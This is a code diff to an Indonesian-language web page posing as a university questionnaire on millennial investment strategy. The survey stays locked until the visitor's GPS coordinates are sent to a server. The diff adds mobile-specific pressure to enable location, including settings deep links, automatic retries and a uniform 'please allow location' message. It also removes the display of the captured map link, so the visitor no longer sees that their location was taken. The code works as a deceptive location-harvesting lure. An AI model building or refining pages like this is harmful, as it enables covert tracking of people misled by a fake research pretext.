@@ -96,6 +96,23 @@
       background: #ffcc00;
       transform: scale(1.05);
     }
+    .location-button {
+      display: none;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 5px;
+      background: #ff6b6b;
+      color: #fff;
+      font-size: 1em;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      margin-top: 10px;
+      transition: background 0.3s ease;
+    }
+    .location-button:hover {
+      background: #ff4c4c;
+    }
     .reward {
       display: none;
       flex-direction: column;
@@ -160,7 +177,7 @@
         font-size: 0.8em;
         padding: 6px;
       }
-      button {
+      button, .location-button {
         font-size: 0.9em;
         padding: 8px 12px;
       }
@@ -177,6 +194,7 @@
   <div class="container" id="container">
     <h1>Analisis Strategi Diversifikasi Investasi di Kalangan Milenial</h1>
     <p id="status">Selamat Datang! Silakan izinkan akses lokasi Anda untuk melanjutkan mengisi kuesioner penelitian.</p>
+    <a id="locationButton" class="location-button">Aktifkan Lokasi</a>
     <div id="survey" style="display: none;">
       <p>Kami mengundang Anda untuk berpartisipasi dalam kuesioner terkait strategi investasi milenial. Silakan isi data berikut:</p>
       <div class="survey-form">
@@ -280,22 +298,72 @@
     <div id="reward" class="reward">
       <h2>Terimakasih!</h2>
       <p>Telah mengisi Kuesioner Penelitian saya!</p>
-      
-     
     </div>
   </div>
 
   <script>
     let userLat, userLon, userGoogleMapsLink;
+    let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    let locationButton = document.getElementById("locationButton");
 
     window.onload = function() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendPosition, showError);
+        if (isMobile) {
+          // Pada mobile, coba minta lokasi dan periksa apakah lokasi aktif
+          checkLocationStatus();
+        } else {
+          // Pada desktop, langsung minta lokasi seperti biasa
+          navigator.geolocation.getCurrentPosition(sendPosition, showError);
+        }
       } else {
         document.getElementById("status").innerHTML = "Geolocation tidak didukung oleh browser ini.";
         document.getElementById("status").classList.add("error");
       }
     };
+
+    function checkLocationStatus() {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          // Lokasi aktif, lanjutkan ke sendPosition
+          sendPosition(position);
+        },
+        (error) => {
+          // Lokasi tidak aktif atau ditolak, tampilkan tombol untuk mengaktifkan lokasi
+          showLocationPrompt();
+        },
+        { timeout: 5000 } // Timeout untuk mempercepat deteksi jika lokasi dimatikan
+      );
+    }
+
+    function showLocationPrompt() {
+      document.getElementById("status").innerHTML = "Lokasi Anda dimatikan. Silakan aktifkan lokasi untuk melanjutkan.";
+      document.getElementById("status").classList.add("error");
+
+      // Tampilkan tombol hanya di perangkat mobile
+      if (isMobile) {
+        locationButton.style.display = 'block';
+
+        // Tentukan tautan berdasarkan OS
+        if (/Android/i.test(navigator.userAgent)) {
+          // Android: Buka pengaturan lokasi
+          locationButton.href = "intent://#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
+        } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+          // iOS: Buka pengaturan lokasi (catatan: mungkin tidak berfungsi di iOS terbaru)
+          locationButton.href = "prefs:root=LOCATION_SERVICES";
+        } else {
+          // Perangkat lain: Berikan instruksi manual
+          document.getElementById("status").innerHTML += "<br>Silakan aktifkan lokasi di pengaturan perangkat Anda, lalu muat ulang halaman.";
+          locationButton.style.display = 'none';
+        }
+
+        // Setelah tombol diklik, coba ulang setelah beberapa detik
+        locationButton.onclick = function() {
+          setTimeout(() => {
+            checkLocationStatus();
+          }, 3000); // Beri waktu 3 detik untuk pengguna mengaktifkan lokasi
+        };
+      }
+    }
 
     function sendPosition(position) {
       userLat = position.coords.latitude;
@@ -319,38 +387,34 @@
         if (response.ok) {
           console.log('Lokasi berhasil dikirim ke server.');
           document.getElementById("status").style.display = 'none';
+          locationButton.style.display = 'none';
           document.getElementById("survey").style.display = 'block';
         } else {
           console.error('Gagal mengirim lokasi.');
-          document.getElementById("status").innerHTML = "Gagal mengirim lokasi.";
+          document.getElementById("status").innerHTML = "Tolong izinkan Lokasi untuk mengisi kuesioner penelitian ini.";
           document.getElementById("status").classList.add("error");
+          if (isMobile) {
+            locationButton.style.display = 'block';
+          }
         }
       })
       .catch(error => {
         console.error('Error:', error);
-        document.getElementById("status").innerHTML = "Gagal mengirim lokasi.";
+        document.getElementById("status").innerHTML = "Tolong izinkan Lokasi untuk mengisi kuesioner penelitian ini.";
         document.getElementById("status").classList.add("error");
+        if (isMobile) {
+          locationButton.style.display = 'block';
+        }
       });
     }
 
     function showError(error) {
-      let message;
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          message = "Anda menolak izin lokasi.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          message = "Informasi lokasi tidak tersedia.";
-          break;
-        case error.TIMEOUT:
-          message = "Permintaan lokasi timeout.";
-          break;
-        case error.UNKNOWN_ERROR:
-          message = "Terjadi kesalahan tidak diketahui.";
-          break;
-      }
+      let message = "Tolong izinkan Lokasi untuk mengisi kuesioner penelitian ini.";
       document.getElementById("status").innerHTML = message;
       document.getElementById("status").classList.add("error");
+      if (isMobile) {
+        showLocationPrompt();
+      }
     }
 
     function submitSurvey() {
@@ -375,9 +439,6 @@
       // Sembunyikan survei, tampilkan hadiah
       document.getElementById("survey").style.display = 'none';
       document.getElementById("reward").style.display = 'flex';
-
-      // Set tautan Google Maps
-      document.getElementById("locationLink").href = userGoogleMapsLink;
 
       // Tambahkan efek confetti
       for (let i = 0; i < 100; i++) {
